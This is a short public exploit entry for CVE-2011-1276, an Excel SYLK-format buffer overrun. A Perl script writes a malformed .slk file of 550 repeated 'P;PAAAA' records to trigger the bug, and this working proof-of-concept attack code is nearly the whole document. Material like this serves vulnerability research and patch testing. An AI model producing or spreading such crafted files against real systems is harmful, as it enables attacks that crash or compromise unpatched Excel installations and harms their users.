# Exploit Title: Excel SLYK Format Parsing Buffer Overrun Vulnerability PoC
# Date: [date]
# Author: webDEViL
# Software Link: [download link if available]
# Version: [app version]
# Tested on: ALL
# CVE : CVE-2011-1276
 
# w3bd3vil[at]gmail[dot]com
# twitter.com/w3bd3vil
 
open (FILE, '>>CVE-2011-1276.slk');
print FILE "ID;P\n";
print FILE "P;PAAAA\n"x550;
print FILE "P";
close (FILE);
